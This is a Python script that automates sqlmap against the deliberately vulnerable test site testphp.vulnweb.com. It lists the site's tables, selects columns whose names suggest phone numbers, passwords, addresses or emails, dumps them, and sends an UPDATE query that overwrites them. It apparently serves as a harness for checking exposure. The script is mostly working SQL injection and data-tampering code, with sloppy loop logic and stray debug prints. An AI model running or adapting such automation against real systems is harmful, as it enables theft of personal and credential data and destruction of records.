import sqlmap.sqlmap
import subprocess
import tableDefinition
import re
import sys

def checkForUnallowedQuery(tableDef: tableDefinition.TableDefinition, blacklist: list[str]):
    for columnIndex in range(len(tableDef.columns)):
        for blacklistElementIndex in range(len(blacklist)):
            if tableDef.columns[columnIndex].lower().find(blacklist[blacklistElementIndex].lower()) != -1:
                return tableDefinition.QueryRequest(True, tableDef.columns[columnIndex],
                                                    blacklist[blacklistElementIndex], tableDef.name, tableDef.databaseName)

    return tableDefinition.QueryRequest(False, tableDef.columns[columnIndex],
                                        blacklist[blacklistElementIndex], tableDef.name, tableDef.databaseName)

def Init():
    Queryflag = False
    Modifyflag = False
    blacklist = ["phone", "pass", "address", "email"]
    # blacklist = ["SUB_PART","DATA_LENGTH"]

    url = "http://testphp.vulnweb.com/artists.php?artist=1"
    command = "sqlmap --url="

    result = subprocess.run(command + url + " --batch --tables --threads=5", shell=True, stdin=subprocess.PIPE, capture_output=True)


    tables_request = str(result.stdout.decode())
    tables_request = str.split(tables_request, '\n') #array where the items are each line of the output of the query


    tableDefinitions = list[tableDefinition.TableDefinition]()
    dbName = ""
    areaMarkerCount = 0
    for x in range(len(tables_request)):

        if tables_request[x].find("+---") != -1 and tables_request[x].find("---+") != -1:
            dbName = tables_request[x - 2]
            dbName = dbName.replace("Database: ", "")

            areaMarkerCount += 1
            continue
        if areaMarkerCount % 2 != 0: #inside the block
            tempString = tables_request[x]
            tempString = tempString.replace("|", "")
            tempString = tempString.replace("\r", "")
            tempString = tempString.replace("\n", "")
            tempString = tempString.strip()
            tempDefinition = tableDefinition.TableDefinition(tempString, dbName)
            tableDefinitions.append(tempDefinition)
    #        print("From table: " + tempDefinition.name)



    for x in range(len(tableDefinitions)):
        #print(tableDefinitions[x].databaseName)
        #print(tableDefinitions[x].name)
        result = subprocess.run(
            "sqlmap -u \"http://testphp.vulnweb.com/artists.php?artist=1\" --threads=5 --sql-query=\"select * from " +
            tableDefinitions[x].databaseName + "." + tableDefinitions[x].name + "\"",
            shell=True, stdin=subprocess.PIPE, capture_output=True)
        queryResult = result.stdout.decode()
        # print(queryResult)
        queryResult = str.split(queryResult, "\n")
        focusLine = ""

        for y in range(len(queryResult)):
            if queryResult[y].find("the query with expanded column name(s) is:") != -1:
                focusLine = queryResult[y]

        focusLine = focusLine[focusLine.find("SELECT") + 6: focusLine.find("FROM")]
        columnNames = str.split(focusLine, ",")
        for z in range(len(columnNames)):
            columnNames[z] = columnNames[z].replace(",", "")
            columnNames[z] = columnNames[z].replace(" ", "")
            tableDefinitions[x].columns.append(columnNames[z])


    #checking if query happened
    for tableDefIndex in range(len(tableDefinitions)):
        queryCheck = checkForUnallowedQuery(tableDefinitions[tableDefIndex], blacklist)
        if queryCheck.result:
            #print("FOUND UNSAFE FIELD [" + queryCheck.columnName + "] SIMILAR TO [" + queryCheck.blacklistedWord +"] IN TABLE [" + queryCheck.table + "] IN DATABASE [" + queryCheck.db + "]" )
            result = subprocess.run(
                "sqlmap -u \"http://testphp.vulnweb.com/artists.php?artist=1\" --threads=5 --sql-query=\"select " + queryCheck.columnName + " from "+ queryCheck.db + "." + queryCheck.table + "\"",
                shell=True, stdin=subprocess.PIPE, capture_output=True)
            querydecode = str(result.stdout.decode())
            querydecode = str.split(querydecode, "\n")
            check = ""
            print("poopoopoo")

            for p in range(len(querydecode)):
                if querydecode[p].find("select " + queryCheck.columnName + " from " + queryCheck.db + "." +queryCheck.table) != -1:
                    #print(querydecode[p])
                    Queryflag = True
            break


    #checking if modify happened
    for tableDefIndex in range(len(tableDefinitions)):
        queryCheck = checkForUnallowedQuery(tableDefinitions[tableDefIndex],blacklist)
        if queryCheck.result:
            # print("FOUND UNSAFE FIELD [" + queryCheck.columnName + "] SIMILAR TO [" + queryCheck.blacklistedWord +"] IN TABLE [" + queryCheck.table + "] IN DATABASE [" + queryCheck.db + "]" )
            result = subprocess.run("sqlmap -u \"http://testphp.vulnweb.com/artists.php?artist=1\" --threads=5 --sql-query=\"update " + queryCheck.db + "." + queryCheck.table + " set " +  queryCheck.columnName + " = modified\"",shell=True, stdin=subprocess.PIPE, capture_output=True)

            modifydecode = result.stdout.decode()
            modifydecode = str.split(modifydecode, "\n")
            checkmodify = ""
            print("poopoo")

            for a in range(len(modifydecode)):
                if modifydecode[a].find("execution of non-query SQL statements is only available when stacked queries are supported") != -1:
                    print("poo")
                    Modifyflag = False
                else:
                    Modifyflag = True
            break

    return (Modifyflag, Queryflag)